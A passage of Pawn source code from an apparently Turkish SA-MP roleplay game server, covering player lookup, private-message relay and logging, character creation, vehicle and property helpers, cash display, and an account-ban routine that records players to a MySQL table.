		if (playerid != INVALID_PLAYER_ID)
		{
			if (count)
			{
				SendClientMessage(playerid, 0xFF0000AA, "Multiple users found, please narrow earch");
			}
			else
			{
				SendClientMessage(playerid, 0xFF0000AA, "No matching user found");
			}
		}
		userid = INVALID_PLAYER_ID;
	}
	return userid; // INVALID_USER_ID for bad return
}
stock ReturnUse2(text[], playerid = INVALID_PLAYER_ID)
{
	new pos = 0;
	while (text[pos] < 0x21) // Strip out leading spaces
	{
		if (text[pos] == 0) return INVALID_PLAYER_ID; // No passed text
		pos++;
	}
	new userid = INVALID_PLAYER_ID;
	if (IsNumeric(text[pos])) // Check whole passed string
	{
		// If they have a numeric name you have a problem (although names are checked on id failure)
		userid = strval(text[pos]);
		if (userid >=0 && userid < MAX_PLAYERS)
		{
			if(!IsPlayerConnected(userid))
			{
				userid = INVALID_PLAYER_ID;
			}
			else
			{
				return userid; // A player was found
			}
		}
		// Removed for fallthrough code
	}
	// They entered [part of] a name or the id search failed (check names just incase)
	new len = strlen(text[pos]);
	new count = 0;
	new name[MAX_PLAYER_NAME];
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			GetPlayerName(i, name, sizeof (name));
			if (strcmp(name, text[pos], true, len) == 0) // Check segment of name
			{
				if (len == strlen(name)) // Exact match
				{
					return i; // Return the exact player on an exact match
					// Otherwise if there are two players:
					// Me and MeYou any time you entered Me it would find both
					// And never be able to return just Me's id
				}
				else // Partial match
				{
					count++;
					userid = i;
				}
			}
		}
	}
	if (count != 1)
	{
		if (playerid != INVALID_PLAYER_ID)
		{
			if (count)
			{
				SendClientMessage(playerid, 0xFF0000AA, "Multiple users found, please narrow earch");
			}
			else
			{
				SendClientMessage(playerid, 0xFF0000AA, "No matching user found");
			}
		}
		userid = INVALID_PLAYER_ID;
	}
	return userid; // INVALID_USER_ID for bad return
}
stock strrest(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}
	new offset = index;
	new result[128];
	while ((index < length) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}
stock IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if (string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}
PlaySoundForPlayer(playerid, soundid)
{
	new Float:pX, Float:pY, Float:pZ;
	GetPlayerPos(playerid, pX, pY, pZ);
	PlayerPlaySound(playerid, soundid,pX, pY, pZ);
}
stock SQLtoID(sqlidne)
{
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i))
		{
			if(Karakter[i][sqlid] == sqlidne)
			{
			return i;
			}
		}
	}
	return INVALID_PLAYER_ID;
}

OnPlayerPrivmsg ( playerid, recieverid, text[] ) {
    new msg[164],string[164],player[MAX_PLAYER_NAME],receiver[MAX_PLAYER_NAME];
    GetPlayerName(playerid,player,sizeof(player));
    GetPlayerName(recieverid,receiver,sizeof(receiver));
    format (msg,164, "[PM] From [%i]%s to [%i]%s: %s",playerid,OyuncuAdiniBul(playerid,1),recieverid,OyuncuAdiniBul(recieverid,1),text);
    printf("[PM] %s",msg);
    for (new a = 0; a < MAX_PLAYERS; a++)
    {
        if (playerid != a && adpmd[a] == 1)
            SendClientMessage (a,0xCCFF00FFAA,msg);
    }
    format (msg,164,"{FEF801}<< %s(%d): %s",OyuncuAdiniBul(playerid,1),playerid,text);
    SendClientMessage(recieverid,0xFEF801FF,msg);
    format (msg,164,"{CBA91F}>> %s(%d): %s",OyuncuAdiniBul(recieverid,1),recieverid,text);
    SendClientMessage(playerid,0xCBA91FFF,msg);
	format(string, sizeof(string), "[PM]%s(gitti): %s", OyuncuAdiniBul(recieverid,1), text);
	Log(playerid, string);
	format(string, sizeof(string), "[PM]%s(geldi): %s", OyuncuAdiniBul(recieverid,1), text);
	Log(recieverid, string);
    lastpm[playerid] = recieverid;
	return 1;
}

stock OyuncuAdiniBul2(playerid, name[], sizeofname)
{
	GetPlayerName(playerid, name, sizeofname);
	new kesbakayim[2][20];
	new string[24];
	split(name, kesbakayim, '_', 20);
	format(string, sizeof(string), "%s%s", kesbakayim[0],kesbakayim[1]);
	strmid(name, string, 0, strlen(string), 255);
	return 1;
}

stock meetTextUpdate(playerid)
{
	new string[24];
	format(string, sizeof(string), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
	UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string);
	return playerid;
}

stock GetPlayerHPColor(Float:health)
{
	if(health > 90) return 0x00B900FF;
	else if(91 > health > 70)return 0x82B900FF;
	else if(71 > health > 40) return 0xAFB900FF;
	else if(41 > health > 20) return 0xB96F00FF;
	else if(21 > health > 0) return 0xB71402FF;
	return 0xB71402FF;
}

IsyeriMesafesi(Float:uzaklik,playerid)
{
	foreach(new i : Business)
	{
		if(PlayerToPoint(uzaklik,playerid,Isyeri[i][girisX],Isyeri[i][girisY],Isyeri[i][girisZ]))
		{
			return i;
		}
	}
	return 0;
}

IsyeriIceridenMesafesi(Float:uzaklik,playerid)
{
	foreach(new i : Business)
	{
		if(PlayerToPoint(uzaklik,playerid,Isyeri[i][cikisX],Isyeri[i][cikisY],Isyeri[i][cikisZ]) && GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw] && GetPlayerInterior(playerid) == Isyeri[i][icikisint])
		{
			return i;
		}
	}
	return 0;
}

EvIcKapiYaninda(playerid)
{
	foreach(new i : Houses)
	{
		if(GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == Ev[i][ecikisint])
		{
		    if(PlayerToPoint(2.0,playerid,Ev[i][cikisX],Ev[i][cikisY],Ev[i][cikisZ]))
		    {
				return i;
			}
		}
	}
	return 0;
}

EvIceridenMesafesi(playerid)
{
	foreach(new i : Houses)
	{
		if(GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == Ev[i][ecikisint])
		{
			return i;
		}
	}
	return 0;
}

EvMesafesi(Float:uzaklik,playerid)
{
	foreach(new i : Houses)
	{
		if(PlayerToPoint(uzaklik,playerid,Ev[i][girisX],Ev[i][girisY],Ev[i][girisZ]) && GetPlayerVirtualWorld(playerid) == Ev[i][egirisvw])
		{
			return i;
		}
	}
	return 0;
}

IsyeriIceri(Float:uzaklik,playerid)
{
	foreach(new i : Business)
	{
		if(PlayerToPoint(uzaklik,playerid,Isyeri[i][cikisX],Isyeri[i][cikisY],Isyeri[i][cikisZ]))
		{
			return i;
		}
	}
	return 0;
}

AllahinYokmu(playerid)
{
	if(Karakter[playerid][telno] < 1)
	{
	    GivePlayerTelephoneNumberEx(playerid);
	}
	if(!RozetNoKontrol(playerid))
	{
	    RozetNoVer(playerid);
	}
	if(Karakter[playerid][maskeno] == 0)
	{
	    MaskeNoVer(playerid);
    }
	if(!EhliyetNoKontrol(playerid))
	{
	    EhliyetNoVer(playerid);
    }
	if(Karakter[playerid][hesapno] == 0)
	{
	    HesapNoVer(playerid);
    }
	if(Karakter[playerid][kimlikno] < 1)
	{
		KimlikNoVer(playerid);
    }
	if(!Karakter[playerid][cinsiyet])
	{
	    ShowPlayerDialog(playerid, 160, DIALOG_STYLE_MSGBOX, "Cinsiyet Seçimi", ""C1"[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\n[!]DÝKKAT ESC tuþuna basmanýz halinde cisiyetiniz kadýn olarak belirlenir.\n\nLütfen seçiminizi yapýnýz.", "Erkek", "Kadýn");
	}
	else if(!Karakter[playerid][uyruk])
	{
	    ShowPlayerDialog(playerid, 163, DIALOG_STYLE_MSGBOX, "Ten Rengi Seçimi", ""C1"[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\n[!]DÝKKAT ESC tuþuna basmanýz halinde ten renginiz beyaz olarak belirlenir.\n\nLütfen seçiminizi yapýnýz.", "Siyahi", "Beyaz");
	}
	else if(Karakter[playerid][skin] <= 0)
	{
		Karakter[playerid][posx] = 182.6387,Karakter[playerid][posy] = -88.6457,Karakter[playerid][posz] = 1002.0234;
		SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
		SetPlayerFacingAngle(playerid, 91.8941);
		SetPlayerInterior(playerid, 18);
		SetPlayerVirtualWorld(playerid, playerid+1);
		SetPlayerCameraPos(playerid,179.4780,-88.2440,1002.0234);
		SetPlayerCameraLookAt(playerid,182.4245,-88.1048,1002.0234);
		TogglePlayerControllable(playerid, 0);
		if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, egirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, egirissiyah, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kgirisbeyaz, "Kiyafet Secimi");
		if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kgirissiyah, "Kiyafet Secimi");
	}
	else if(!Karakter[playerid][yas])
	{
	    ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", ""C1"[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
	}
	/*else if(!NickKontrolEx(playerid))
	{
	    ShowPlayerDialog(playerid, 295, DIALOG_STYLE_INPUT, "Nick Seçimi", ""C1"[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen nickinizi girin. ", "Seçim", "");
	}*/
	else if(!DilKontrolEx(playerid))
	{
	    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
	}
	else if(!Karakter[playerid][boy])
	{
	    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
	}
	else if(!Karakter[playerid][kilo])
	{
	    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
	}
	else if(!Karakter[playerid][gozrenk])
	{
	    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
	}
	else if(!Karakter[playerid][sacrenk])
	{
	    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
	}
}

KilitAc(vid)
{
	if(IsValidVehicle(vid))
	{
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vid,engine,lights,alarm,VEHICLE_PARAMS_OFF,bonnet,boot,objective);
		Arac[vid][akilit] = 0;
	}
}

KilitKapat(vid)
{
	if(IsValidVehicle(vid))
	{
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		SetVehicleParamsEx(vid,engine,lights,alarm,VEHICLE_PARAMS_ON,bonnet,boot,objective);
		Arac[vid][akilit] = 1;
	}
}

GetMotor(vid){
	if(IsValidVehicle(vid))
	{
		new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
		if(engine == -1) engine = 1;
		return engine;
	}
	return 0;
}

GetVehicleInterior(vehicleid)
{
	if(vehicleid < 1 || vehicleid > MAX_VEHICLES) return 0; // Invalid vehicleid
    return Arac[vehicleid][ainterior];
}

AracSay_Ex(i)
{
	new __sayi=0;
	for(new q;q<MAX_VEHICLES;q++)
	{
	    if(!IsValidVehicle(q)) continue;
		if(Arac[q][aowner] == Karakter[i][sqlid])__sayi++;
	}
	return __sayi;
}

AracSay(i)
{
	new __sayi=0;
	for(new q;q<MAX_VEHICLES;q++)
	{
	    if(!IsValidVehicle(q)) continue;
		if(Arac[q][aowner] == Karakter[i][sqlid] || Karakter[i][aanahtar][q] == 1)__sayi++;
	}
	return __sayi;
}

AracSayEx(i)
{
	new __sayi=0;
	for(new q;q<MAX_VEHICLES;q++)
	{
	    if(!IsValidVehicle(q)) continue;
		if(Arac[q][aowner] == Karakter[i][sqlid] || Karakter[i][aanahtar][q] == 1)__sayi++;
		if(Birlik[Karakter[i][birlik]][ftip] != LSPD && Birlik[Karakter[i][birlik]][ftip] != SANTV && Birlik[Karakter[i][birlik]][ftip] != ASMS && Birlik[Karakter[i][birlik]][ftip] != LSFD && Arac[q][abirlik] == Karakter[i][birlik])__sayi++;
	}
	return __sayi;
}

IsyeriSay(i)
{
	new sadoyla = 0;
	foreach(new q : Business)
	{
		if(Isyeri[q][isahip] == Karakter[i][sqlid] || Isyeri[q][ortak] == Karakter[i][sqlid])sadoyla++;
	}
	return sadoyla;
}

Evlerim(i)
{
	new sadoyla = 0;
	foreach(new q : Houses)
	{
		if(Ev[q][esahip] == Karakter[i][sqlid] || Ev[q][kiralayan] == Karakter[i][sqlid] || Karakter[i][eanahtar][Ev[q][eid]] == 1)sadoyla++;
	}
	return sadoyla;
}

ParkDurum(playerid)
{
	new yarram;
	for(new vid; vid < MAX_VEHICLES; vid++)
	{
		if(PlayerToPoint(5.0, playerid, Arac[vid][aposx], Arac[vid][aposy], Arac[vid][aposz]))
		{
			yarram = 0;
			break;
		}
		else
		{
			yarram = 1;
		}
	}
	return yarram;
}

GivePlayerCash(playerid, money)
{
	new string[128];
	if(money < 0)
	{
	    new string2[10];
	    new stringmid[10];
	    format(string2, sizeof(string2), "%d", money);
 		strmid(stringmid, string2, 1, strlen(string2), 10);
	    format(string, sizeof(string), "~r~-$%s", stringmid);
	    GameTextForPlayer(playerid, string, 1500, 1);
	}
	else
	{
	    format(string, sizeof(string), "~g~+$%d", money);
	    GameTextForPlayer(playerid, string, 1500, 1);
	}
	Karakter[playerid][para] += money;
	ResetMoneyBar(playerid);
	GivePlayerMoney(playerid,Karakter[playerid][para]);
	new mmstring[32];
	format(mmstring, sizeof(mmstring), "~w~%08d", Karakter[playerid][para]);
 	PlayerTextDrawSetString(playerid, ParaTD[playerid], mmstring);
	return Karakter[playerid][para];
}

SetPlayerCash(playerid, money)
{
	Karakter[playerid][para] = money;
	ResetMoneyBar(playerid);//Resets the money in the original moneybar, Do not remove!
	GivePlayerMoney(playerid,Karakter[playerid][para]);
	new mmstring[32];
	format(mmstring, sizeof(mmstring), "~w~%08d", Karakter[playerid][para]);
 	PlayerTextDrawSetString(playerid, ParaTD[playerid], mmstring);
	return Karakter[playerid][para];
}

GetPlayerCash(playerid)
{
	return Karakter[playerid][para];
}

Kilitle(who, i, sebep[])
{
	TogglePlayerControllable(i, 0);
	ClearScreen(i);
 	ShowMainScreen(i);
	SetPlayerPos(i, 2092.5251,-1834.8268,10.6937);
	SetPlayerCameraPos(i, 2036.2668,-1688.4971,73.8019);
	SetPlayerCameraLookAt(i, 2050.1069,-1703.2759,60.8849);
	SendClientMessage(i,0xE84D4DAA,"[Hesap Kilitlendi]");
 	SendClientMessage(i,0xE84D4DAA,"Hesabýnýza eriþim sistem tarafýndan engellendi.");
 	SendClientMessage(i,0xE84D4DAA,"Bunun nedeni hile yapmanýz veya hatalý yasaklanma olabilir.");
 	SendClientMessage(i,0xE84D4DAA,"Bilgi için lütfen websitemizi ziyaret ediniz.");
	SendClientMessage(i,0xE84D4DAA,"[www.eightbornrpg.com/forum]");
	new string[128],wall[MAX_PLAYER_NAME];
	GetPlayerName(i,string,sizeof(string));
	Karakter[i][kilit] = 1;
	new mtext[20];
	new year, month,day;
	getdate(year, month, day);
	if(month == 1) { mtext = "Ocak"; }
	else if(month == 2) { mtext = "Subat"; }
	else if(month == 3) { mtext = "Mart"; }
	else if(month == 4) { mtext = "Nisan"; }
	else if(month == 5) { mtext = "Mayis"; }
	else if(month == 6) { mtext = "Haziran"; }
	else if(month == 7) { mtext = "Temmuz"; }
	else if(month == 8) { mtext = "Agustos"; }
	else if(month == 9) { mtext = "Eylul"; }
	else if(month == 10) { mtext = "Ekim"; }
	else if(month == 11) { mtext = "Kasim"; }
	else if(month == 12) { mtext = "Aralik"; }
	new hour,minuite,second;
	gettime(hour,minuite,second);
	if(who == -1)
	{
		wall = "Antihile";
	}
	else
	{
		GetPlayerName(who,wall,sizeof(wall));
	}
	new ipmiver[128], query[1024], playerserial[128];
	GetPlayerIp(i, ipmiver, sizeof(ipmiver));
	gpci(i,playerserial,sizeof(playerserial));
	new mstring[512];
	format(mstring, sizeof(mstring), "Tarih:[%d %s %d] - Saat:[%d:%d]", day,mtext,year,hour,minuite);
	format(query, sizeof(query), "INSERT INTO `banlistesi` (`ad`, `neden`, `ipadresi`, `serialip`, `yasaklayan`, `tarih`) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')", OyuncuAdiniBul(i), sebep, ipmiver, playerserial, Karakter[who][anick], mstring);
	mysql_tquery(1,query);
	//format(query, sizeof(query), "INSERT INTO `bkarakterler` SELECT * FROM `karakterler` WHERE `id` = '%d'",Karakter[i][sqlid]);
	//mysql_tquery(1,query);
	new nstring[38];
	format(nstring, sizeof(nstring), "%sBAN",Karakter[i][nick]);
	format(query, sizeof(query), "UPDATE `karakterler` SET `Nickname` = '%s', `neden` = '%s' WHERE `id` = '%d'",nstring,sebep,Karakter[i][sqlid]);
	mysql_tquery(1,query);
	format(string,sizeof(string),"[%s] -- Tarih:[%d %s %d] -- Saat:[%d:%d] - Yasaklayan: %s - %s",string,day,mtext,year,hour,minuite,wall,sebep);
	Log(i,string);
	Kick(i);
}

ArabaSil(a)
{
	if(IsValidVehicle(a))
	{
		if(Arac[a][aid] < 1){printf("Araç bulunamadý %d/%d DBG1",a,Arac[a][aid]); return 1;}
	    Arac[a][aowner] = -1;
	    Arac[a][amodel] = 0;
	    Arac[a][ahasar] = 0.0;
		MotoruKapat(a);
		DestroyVehicle(a);
		//LinkVehicleToInterior(a, 1881);
		SetVehicleVirtualWorld(a, 1453);
		new sorgu1[200];
		format(sorgu1, sizeof(sorgu1), "DELETE FROM `araclar` WHERE `sqlid` = '%d'", Arac[a][aid]);
		mysql_tquery(1,sorgu1);

	    printf("%d idli araç veritabanýndan silindi(veriler boþaltýldý).", Arac[a][aid]);
	    DeleteVehicleInfo(a);
	}
	else
	{
	    printf("%d idli araç veritabanýndan silinmek istendi fakat baþarýsýz oldu", a);
	}
	return 1;
}

DeleteVehicleInfo(vehicleid)
{
	Arac[vehicleid][aid] = 0;
	Arac[vehicleid][amodel] = 0;
	Arac[vehicleid][aposx] = 0.0;
	Arac[vehicleid][aposy] = 0.0;
	Arac[vehicleid][aposz] = 0.0;
	Arac[vehicleid][aposa] = 0.0;
	Arac[vehicleid][ainterior] = 0;
	Arac[vehicleid][avworld] = 0;
	Arac[vehicleid][arenk1] = 0;
	Arac[vehicleid][arenk2] = 0;
	Arac[vehicleid][afiyat] = 0;
	format(Arac[vehicleid][aplaka], 1, "");
	Arac[vehicleid][aowner] = 0;
	Arac[vehicleid][ahasar] = 0.0;
	Arac[vehicleid][atip] = 0;
	Arac[vehicleid][aspawn] = 0;
	Arac[vehicleid][aspawnsatin] = 0;
	Arac[vehicleid][akilit] = 0;
	Arac[vehicleid][akilittip] = 0;
	Arac[vehicleid][abenzin] = 0.0;
	Arac[vehicleid][apaintjob] = 0;
	Arac[vehicleid][aexhaust] = 0;
	Arac[vehicleid][afrontbumper] = 0;
	Arac[vehicleid][arearbumper] = 0;
	Arac[vehicleid][aroof] = 0;
	Arac[vehicleid][aspoilers] = 0;
	Arac[vehicleid][asideskirts] = 0;
	Arac[vehicleid][abullbars] = 0;
	Arac[vehicleid][atekerlek] = 0;
	Arac[vehicleid][acarstereo] = 0;
	Arac[vehicleid][ahidrolik] = 0;
	Arac[vehicleid][anitro] = 0;
	Arac[vehicleid][aalarm] = 0;
	Arac[vehicleid][apanels] = 0;
	Arac[vehicleid][adoors] = 0;
	Arac[vehicleid][alights] = 0;
	Arac[vehicleid][atires] = 0;
	Arac[vehicleid][yedekanahtar] = 0;
	Arac[vehicleid][akm] = 0;
	Arac[vehicleid][atextdurum] = 0;
	Arac[vehicleid][abirlik] = 0;
	Arac[vehicleid][asure] = 0;
	Arac[vehicleid][ametre] = 0;
	Arac[vehicleid][abirlik] = 255;
	Arac[vehicleid][abirliktip] = 0;
	Arac[vehicleid][asure] = 0;
	Arac[vehicleid][acezamiktar] = 0;
	Arac[vehicleid][siren] = 0;
	Arac[vehicleid][aimmo] = 0;
	Arac[vehicleid][aneon] = 0;
	//yaptým
	Arac[vehicleid][silah1] = 0;
	Arac[vehicleid][mermi1] = 0;
	Arac[vehicleid][silah2] = 0;
	Arac[vehicleid][mermi2] = 0;
	Arac[vehicleid][silah3] = 0;
	Arac[vehicleid][mermi3] = 0;
	//yaptým fin
	format(Arac[vehicleid][atextyazi], 1, "");
	format(Arac[vehicleid][aceza], 1, "");
	Arac[vehicleid][abenzintip] = 0;
	Arac[vehicleid][ahizsabit] = 0;
	//
	Materyal[vehicleid][A] = 0;
	Materyal[vehicleid][B] = 0;
	Materyal[vehicleid][C] = 0;
	Materyal[vehicleid][D] = 0;
	Materyal[vehicleid][E] = 0;
	return 1;
}

ElineVer(playerid, object)
{
	SetPlayerAttachedObject( playerid, 9, object, 1, -0.064613, 0.520760, 0.000000, 0.000000, 84.217391, 0.000000, 1.000000, 1.000000, 1.000000 );
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
	Tasiyor[playerid] = object;
}

ElindenAl(playerid)
{
    RemovePlayerAttachedObject(playerid, 9);
	ClearAnimations(playerid);
	SetPlayerSpecialAction(playerid, 0);
	Tasiyor[playerid] = 0;
}

YereBirak(playerid, object, tur)
{
    ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);
    ApplyAnimationEx(playerid,"BOMBER","BOM_Plant_Crouch_In",4.1,0,1,1,1,1);

    // burada oyuncunun pozisyonunu ve önünü buluyoruz.
	new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	z -= 0.8;

	// tur == 1 / saksý - esrar
	if(tur == 1)
	{
		new Cache:cache = mysql_query("INSERT INTO  `uyusturucular` (`id`) VALUES ('NULL')", true);
		new uyid = cache_insert_id();
		cache_delete(cache);
		Uyusturucu[uyid][uobje] = CreateDynamicObject(object, x, y, z, 0.0, 0.0, 0.0, GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
		Uyusturucu[uyid][utip] = 0;
		Uyusturucu[uyid][udurum] = 0;
		Uyusturucu[uyid][udakika] = 0;
		Uyusturucu[uyid][ux] = x;
		Uyusturucu[uyid][uy] = y;
		Uyusturucu[uyid][uz] = z;
		Uyusturucu[uyid][uinterior] = GetPlayerInterior(playerid);
		Uyusturucu[uyid][uvworld] = GetPlayerVirtualWorld(playerid);
		UyusturucuKaydet(uyid);

    }
    else CreateDynamicObject(object, x, y, z, 0.0, 0.0, 0.0);
    ObjeKurdu(playerid);
}

UyusturucuSil(uyid)
{
	new query[256];
	format(query, sizeof(query), "DELETE FROM uyusturucular WHERE id = '%d'", uyid);
	mysql_tquery(1,query);
	Uyusturucu[uyid][utip] = 0;
	Uyusturucu[uyid][udurum] = 0;
	Uyusturucu[uyid][udakika] = 0;
	Uyusturucu[uyid][ux] = 0.0;
	Uyusturucu[uyid][uy] = 0.0;
	Uyusturucu[uyid][uz] = 0.0;
	Uyusturucu[uyid][uinterior] = 0;
	Uyusturucu[uyid][uvworld] = 0;
	DestroyDynamicObject(Uyusturucu[uyid][uobje]);
	Uyusturucu[uyid][uobje] = 0;
}

forward Float:GetPlayerCan(playerid);
public Float:GetPlayerCan(playerid)
{
	new Float:health;
	GetPlayerHealth(playerid, health);
	return health;
}
forward Float:GetPlayerZirh(playerid);
public Float:GetPlayerZirh(playerid)
{
	new Float:health;
	GetPlayerArmour(playerid, health);
	return health;
}

ShowIDuzenle(playerid, isid)
{
    new asdf[500];
	format(asdf, sizeof(asdf), "Seçenek\tDurum\nAd:\t%s\nSahip:\t%d (%s)\nGiris X:\t%f\nGiris Y:\t%f\nGiris Z:\t%f\nGiris VW:\t%d\nGiris INT:\t%d\nGiris ANGLE:\t%f\nCikis X:\t%f\nCikis Y:\t%f\nCikis Z:\t%f\nCikis INT:\t%d\nCikis ANGLE:\t%f\nFiyat:\t$%d\nGiris ucreti:\t$%d\nKasa:\t$%d\nVergi:\t$%d\nKilit:\t%d\nTip:\t%d\nYedek Anahtar:\t%d\nStok:\t%d\nKarþýlama M.:\t%s\nCikis VW:\t%d",
	Isyeri[isid][iad],
	Isyeri[isid][isahip],
	SQLFromName(Isyeri[isid][isahip]),
	Isyeri[isid][girisX],
	Isyeri[isid][girisY],
	Isyeri[isid][girisZ],
	Isyeri[isid][igirisvw],
	Isyeri[isid][igirisint],
	Isyeri[isid][girisangle],
	Isyeri[isid][cikisX],
	Isyeri[isid][cikisY],
	Isyeri[isid][cikisZ],
	Isyeri[isid][icikisint],
	Isyeri[isid][cikisangle],
	Isyeri[isid][ifiyat],
	Isyeri[isid][girisucreti],
	Isyeri[isid][ikasa],
	Isyeri[isid][ivergi],
	Isyeri[isid][ikilit],
	Isyeri[isid][itip],
	Isyeri[isid][yedekanahtar],
	Isyeri[isid][istok],
	Isyeri[isid][karsilama],
	Isyeri[isid][icikisvw]);
	ShowPlayerDialog(playerid, 17, DIALOG_STYLE_TABLIST_HEADERS,"Ýþyeri Düzenleme Menüsü", asdf, "Seç", "Ýptal");
	DestroyDynamic3DTextLabel(Isyeri[isid][itext]);
	IsyeriAyarla(isid);
}

ShowEDuzenle(playerid, evid)
{
    new asdf[400];
    format(asdf, sizeof(asdf), "Seçenek (%d)\tDurum\nKonum:\t%s\nSahip:\t%d (%s)\nGiris X:\t%f\nGiris Y:\t%f\nGiris Z:\t%f\nGiris VW:\t%d\nGiris INT:\t%d\nGiris ANGLE:\t%f\nCikis X:\t%f\nCikis Y:\t%f\nCikis Z:\t%f\nCikis INT:\t%d\nCikis ANGLE:\t%f\nFiyat:\t$%d\nKilit:\t%d\nKira\t%d\nKiralayan\t%d (%s)\nKira Fiyat\t$%d",
    Ev[evid][eid],
	Ev[evid][ekonum],
	Ev[evid][esahip],
	SQLFromName(Ev[evid][esahip]),
	Ev[evid][girisX],
	Ev[evid][girisY],
	Ev[evid][girisZ],
	Ev[evid][egirisvw],
	Ev[evid][egirisint],
	Ev[evid][egirisangle],
	Ev[evid][cikisX],
	Ev[evid][cikisY],
	Ev[evid][cikisZ],
	Ev[evid][ecikisint],
	Ev[evid][ecikisangle],
	Ev[evid][efiyat],
	Ev[evid][ekilit],
	Ev[evid][kira],
	Ev[evid][kiralayan],
	SQLFromName(Ev[evid][kiralayan]),
	Ev[evid][kirafiyat]);
	ShowPlayerDialog(playerid, 74, DIALOG_STYLE_TABLIST_HEADERS, "Ev Düzenleme Menüsü", asdf, "Seç", "Kapat");
	DestroyColouredCheckpoint(Ev[evid][ecp]);
    EvAyarla(evid);
}

ShowKDuzenle(playerid, giveplayerid)
{
	new cinsiyetstr[10], uyrukstr[10], string[1024];
	if(Karakter[giveplayerid][cinsiyet] == 1) format(cinsiyetstr, sizeof(cinsiyetstr), "Erkek");
	if(Karakter[giveplayerid][cinsiyet] == 2) format(cinsiyetstr, sizeof(cinsiyetstr), "Kadýn");
	if(Karakter[giveplayerid][uyruk] == 1) format(uyrukstr, sizeof(cinsiyetstr), "Siyahi");
	if(Karakter[giveplayerid][uyruk] == 2) format(uyrukstr, sizeof(cinsiyetstr), "Beyaz");

	format(string, sizeof(string), "Ýsim\t%s\n\
	Þifre\t******\n\
	Interior\t%d\n\
	Virtual World\t%d\n\
	Seviye\t%d\n\
	Seviye Puaný\t%d\n\
	Skin\t%d\n\
	Health\t%f\n\
	Armour\t%f\n\
	Dil\t%s\n\
	Yaþ\t%d\n\
	Cinsiyet\t%s\n\
	Ten Rengi\t%s\n\
	Birlik ID\t%d\n\
	Birlik Rütbe ID\t%d\n\
	Kodes Süresi\t%d\n\
	A-Jail Süresi\t%d\n\
	Telefon NO\t%d\n\
	Chat Stili\t%d\n\
	Meslek\t%d\n\
	Esrar\t%d\n\
	Saksý\t%d\n\
	Esrar Tohumu\t%d\n\
	Kas Seviyesi\t%d\n\
	Kas Puaný\t%d\n\
	Materyal A\t%d\n\
	Materyal B\t%d\n\
	Materyal C\t%d\n\
	Materyal D\t%d\n\
	Materyal E\t%d\n",
	OyuncuAdiniBul(giveplayerid),
	GetPlayerInterior(giveplayerid),
	GetPlayerVirtualWorld(giveplayerid),
	Karakter[giveplayerid][level],
	Karakter[giveplayerid][exp],
	GetPlayerSkinEx(giveplayerid),
	GetPlayerCan(giveplayerid),
	GetPlayerZirh(giveplayerid),
	DilName(giveplayerid),
	Karakter[giveplayerid][yas],
	cinsiyetstr,
	uyrukstr,
	Karakter[giveplayerid][birlik],
